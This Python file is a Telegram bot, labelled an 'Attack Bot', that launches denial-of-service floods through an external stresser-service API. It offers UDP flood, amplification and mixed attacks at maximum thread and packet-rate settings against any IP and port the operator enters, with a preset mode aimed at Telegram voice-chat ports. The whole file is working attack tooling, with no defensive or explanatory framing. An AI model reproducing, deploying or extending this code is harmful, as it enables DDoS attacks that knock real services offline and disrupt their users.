# app.py - Optimized for Telegram VC
import os
import logging
import asyncio
import threading
import aiohttp
import time
import json
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 2

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== TELEGRAM ATTACK PORTS =====
TELEGRAM_PORTS = {
    "voip": [32001, 32002, 32003, 32004, 32005, 3478, 3479, 3480, 3481],
    "mtproto": [443, 80, 5222, 5223, 5224, 5225],
    "cdn": [443, 80, 8080, 8443],
    "voice": [32001, 32002, 32003, 32004, 32005, 3478, 3479]
}

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.attack_logs = []
        self.total_attacks = 0
    
    def can_start_attack(self, user_id):
        with self.lock:
            user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
            if user_attacks >= MAX_CONCURRENT:
                return False, f"❌ You already have {user_attacks} active attack(s). Max: {MAX_CONCURRENT}"
            if len(self.active_attacks) >= 20:
                return False, "❌ Too many active attacks globally."
            return True, "OK"
    
    def start_attack(self, user_id, target, port, duration, method):
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            self.total_attacks += 1
            self.active_attacks[attack_id] = {
                'id': attack_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'start_time': datetime.now(),
                'status': 'running'
            }
            return attack_id
    
    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id]['status'] = 'stopped'
                return True
            return False
    
    def get_active_attacks(self, user_id=None):
        with self.lock:
            if user_id:
                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
            return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
    
    def log_attack(self, user_id, target, port, duration, method, status, response):
        self.attack_logs.append({
            'user_id': user_id,
            'target': target,
            'port': port,
            'duration': duration,
            'method': method,
            'status': status,
            'response': response[:500],
            'timestamp': datetime.now()
        })
    
    def cleanup(self):
        with self.lock:
            now = datetime.now()
            to_remove = []
            for aid, att in self.active_attacks.items():
                if att['status'] == 'stopped':
                    to_remove.append(aid)
                elif (now - att['start_time']).seconds > att['duration'] + 10:
                    to_remove.append(aid)
            for aid in to_remove:
                del self.active_attacks[aid]

attack_manager = AttackManager()

# ===== POWERFUL ATTACK API CALLER =====
async def send_powerful_attack(target, port, duration, method):
    """Send maximum power attack"""
    url = "https://api.susstresser.com/panel/api/api.php"
    
    # Multiple attack parameters for maximum power
    attack_configs = [
        # Standard UDP Flood
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": method.upper(),
            "threads": 2000,
            "pps": 2000000,
            "bps": 2000000000,
            "size": 65500,
            "random": "true"
        },
        # UDP Amplification
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "UDP",
            "threads": 1500,
            "pps": 1500000,
            "type": "amplification",
            "amplification": "true"
        },
        # Mixed Attack
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "MIX",
            "threads": 1000,
            "pps": 1000000,
            "type": "mixed"
        }
    ]
    
    results = []
    success_count = 0
    
    for config in attack_configs:
        try:
            timeout = aiohttp.ClientTimeout(total=duration + 15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start_time = time.time()
                async with session.get(url, params=config) as response:
                    elapsed = time.time() - start_time
                    result = await response.text()
                    
                    is_success = response.status == 200 and "SUCCESS" in result
                    if is_success:
                        success_count += 1
                    
                    results.append({
                        'method': config.get('method', 'UDP'),
                        'status': response.status,
                        'elapsed': elapsed,
                        'success': is_success,
                        'response': result[:300]
                    })
                    
                    logger.info(f"Attack attempt: Status {response.status}, Time: {elapsed:.2f}s")
                    
        except Exception as e:
            logger.error(f"Attack attempt failed: {e}")
            results.append({
                'method': config.get('method', 'UDP'),
                'success': False,
                'error': str(e)
            })
    
    # Return combined result
    return {
        "success": success_count > 0,
        "attempts": success_count,
        "total_attempts": len(attack_configs),
        "results": results,
        "target": target,
        "port": port,
        "duration": duration,
        "summary": f"✅ {success_count}/{len(attack_configs)} attacks sent to {target}:{port}"
    }

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("🎯 TELEGRAM VC", callback_data="telegram_vc")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
    ]
    
    if update.effective_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await update.message.reply_text(
        "⚡ *POWER ATTACK BOT*\n\n"
        "🔥 Maximum Power UDP Stress\n"
        "🎯 Optimized for Telegram VC\n"
        "💪 Multi-threaded Attacks\n\n"
        "📌 *Commands:*\n"
        "/attack IP PORT DURATION\n"
        "/telegram IP DURATION\n"
        "/status - Check bot status\n\n"
        "Example: `/telegram 91.108.17.19 60`\n"
        "This will attack all Telegram VC ports!",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def telegram_vc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Attack all Telegram VC ports at once"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can use this.")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "❌ *Usage:* `/telegram IP DURATION`\n\n"
            "This attacks ALL Telegram voice ports simultaneously!\n"
            "Example: `/telegram 91.108.17.19 60`\n\n"
            f"Ports being attacked:\n{', '.join(map(str, TELEGRAM_PORTS['voip'][:5]))}...",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        duration = int(args[1])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            return
        
        # Attack all Telegram ports
        ports = TELEGRAM_PORTS['voip']
        status_msg = await update.message.reply_text(
            f"🚀 *TELEGRAM VC ATTACK*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Attacking {len(ports)} ports\n"
            f"⏱️ Duration: {duration}s\n"
            f"⚡ Power: MAXIMUM\n\n"
            f"⏳ Launching multi-port attack...",
            parse_mode='Markdown'
        )
        
        # Send attacks to all ports
        attack_results = []
        for port in ports[:5]:  # Limit to 5 ports to avoid rate limiting
            attack_id = attack_manager.start_attack(user_id, target, port, duration, "UDP")
            result = await send_powerful_attack(target, port, duration, "UDP")
            attack_results.append({
                'port': port,
                'success': result.get('success', False),
                'summary': result.get('summary', 'N/A')
            })
            attack_manager.stop_attack(attack_id)
            await asyncio.sleep(0.5)  # Small delay between attacks
        
        # Build response
        success_count = sum(1 for r in attack_results if r['success'])
        response_text = (
            f"✅ *TELEGRAM VC ATTACK COMPLETE*\n\n"
            f"🎯 Target: `{target}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"📡 Ports Attacked: {success_count}/{len(attack_results)}\n\n"
            f"📊 *Results:*\n"
        )
        
        for r in attack_results:
            status = "✅" if r['success'] else "❌"
            response_text += f"{status} Port {r['port']}: {r['summary']}\n"
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Powerful attack on single port"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can use /attack.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ *Usage:* `/attack IP PORT DURATION`\n\n"
            "Example: `/attack 91.108.17.19 32001 60`\n"
            "Duration: 60-300 seconds",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *ATTACKING*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"⚡ Power: MAXIMUM\n\n"
            f"⏳ Sending attacks...",
            parse_mode='Markdown'
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "UDP")
        result = await send_powerful_attack(target, port, duration, "UDP")
        
        response_text = (
            f"✅ *ATTACK COMPLETED*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"📊 Attack ID: `{attack_id}`\n"
            f"⚡ Status: {'✅ SUCCESS' if result.get('success') else '❌ PARTIAL'}\n\n"
            f"📡 {result.get('summary', 'N/A')}\n"
        )
        
        if result.get('results'):
            response_text += f"\n📊 *Details:*\n"
            for r in result['results']:
                status = "✅" if r.get('success') else "❌"
                response_text += f"{status} Method: {r.get('method', 'N/A')} - {r.get('status', 'N/A')}\n"
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check bot status"""
    active = attack_manager.get_active_attacks()
    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"⚡ Active Attacks: {len(active)}\n"
        f"📊 Total Attacks: {attack_manager.total_attacks}\n"
        f"🔑 API Key: {API_KEY[:10]}...\n"
        f"💪 Power: MAXIMUM\n"
        f"🌐 Status: ONLINE\n\n"
        f"📌 *Telegram VC Ports:*\n"
        f"{', '.join(map(str, TELEGRAM_PORTS['voip'][:5]))}...",
        parse_mode='Markdown'
    )

async def telegram_vc_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Telegram VC attack from button"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🎯 *TELEGRAM VC ATTACK*\n\n"
        "Send target IP and duration:\n"
        "`IP DURATION`\n\n"
        "Example: `91.108.17.19 60`\n\n"
        f"Ports being attacked: {', '.join(map(str, TELEGRAM_PORTS['voip'][:5]))}...\n\n"
        "This attacks ALL Telegram voice ports simultaneously!",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_telegram_vc'] = True

async def process_telegram_vc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process Telegram VC attack"""
    if not context.user_data.get('awaiting_telegram_vc'):
        return
    
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can attack.")
        context.user_data['awaiting_telegram_vc'] = False
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        duration = int(parts[1])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            context.user_data['awaiting_telegram_vc'] = False
            return
        
        # Attack all ports
        ports = TELEGRAM_PORTS['voip']
        status_msg = await update.message.reply_text(
            f"🚀 Attacking {len(ports)} Telegram VC ports...\n"
            f"Target: {target}\n"
            f"Duration: {duration}s"
        )
        
        results = []
        for port in ports[:5]:
            attack_id = attack_manager.start_attack(user_id, target, port, duration, "UDP")
            result = await send_powerful_attack(target, port, duration, "UDP")
            results.append({'port': port, 'success': result.get('success', False)})
            attack_manager.stop_attack(attack_id)
            await asyncio.sleep(0.5)
        
        success = sum(1 for r in results if r['success'])
        
        response = f"✅ *TELEGRAM VC ATTACK COMPLETE*\n\n🎯 Target: `{target}`\n📡 Ports: {success}/{len(results)} successful\n⏱️ Duration: {duration}s"
        await status_msg.edit_text(response, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_telegram_vc'] = False

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🎯 UDP", callback_data="method_udp")],
        [InlineKeyboardButton("🔥 HTTP", callback_data="method_http")],
        [InlineKeyboardButton("💣 TCP", callback_data="method_tcp")],
        [InlineKeyboardButton("⚡ MIX", callback_data="method_mix")],
        [InlineKeyboardButton("🎯 TELEGRAM VC", callback_data="telegram_vc")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "💥 *SELECT ATTACK METHOD*\n\n"
        "Choose your attack type:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    method = query.data.split('_')[1]
    context.user_data['attack_method'] = method
    
    await query.edit_message_text(
        f"⚔️ *{method.upper()} ATTACK*\n\n"
        "Send: `IP PORT DURATION`\n"
        "Example: `91.108.17.19 32001 60`\n\n"
        "Duration: 60-300 seconds",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can attack.")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        method = context.user_data.get('attack_method', 'udp')
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            context.user_data['awaiting_attack'] = False
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 Attacking {target}:{port} for {duration}s..."
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
        result = await send_powerful_attack(target, port, duration, method)
        
        await status_msg.edit_text(
            f"✅ *ATTACK COMPLETED*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"📊 Attack ID: `{attack_id}`\n"
            f"⚡ Status: {'✅ SUCCESS' if result.get('success') else '❌ PARTIAL'}\n\n"
            f"📡 {result.get('summary', 'N/A')}",
            parse_mode='Markdown'
        )
        
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def active_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks(query.from_user.id)
    if not active:
        text = "📊 *NO ACTIVE ATTACKS*"
    else:
        text = f"📊 *ACTIVE ATTACKS ({len(active)})*\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} - {remaining}s left\n"
    
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"👤 *USER INFO*\n\n"
        f"🆔 ID: `{query.from_user.id}`\n"
        f"⭐ Level: {'ADMIN' if query.from_user.id == OWNER_ID else 'USER'}\n"
        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
        f"📡 API: {'Connected' if API_KEY else 'No Key'}\n\n"
        f"🎯 Telegram VC Ports:\n{', '.join(map(str, TELEGRAM_PORTS['voip'][:5]))}...",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("📊 VIEW LOGS", callback_data="admin_logs")],
        [InlineKeyboardButton("📡 ACTIVE ATTACKS", callback_data="admin_active")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    logs = attack_manager.attack_logs[-10:]
    if not logs:
        text = "📊 *NO ATTACK LOGS*"
    else:
        text = f"📊 *LAST {len(logs)} ATTACKS*\n\n"
        for log in reversed(logs):
            status = "✅" if log['status'] == 'success' else "❌"
            text += f"{status} {log['target']}:{log['port']} - {log['duration']}s\n"
    
    await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]))

async def admin_active(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks()
    if not active:
        text = "📊 *NO ACTIVE ATTACKS*"
    else:
        text = f"📊 *ACTIVE ATTACKS ({len(active)})*\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} - {remaining}s left\n"
    
    await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]))

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("🎯 TELEGRAM VC", callback_data="telegram_vc")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
    ]
    
    if query.from_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await query.edit_message_text(
        "⚡ *MAIN MENU*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== RUN BOT =====
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("telegram", telegram_vc_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # Callback handlers
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
    app.add_handler(CallbackQueryHandler(telegram_vc_callback, pattern="^telegram_vc$"))
    app.add_handler(CallbackQueryHandler(active_callback, pattern="^active$"))
    app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(admin_logs, pattern="^admin_logs$"))
    app.add_handler(CallbackQueryHandler(admin_active, pattern="^admin_active$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    # Message handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_telegram_vc))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ Bot started polling for updates!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("⚡ POWER ATTACK BOT STARTING...")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)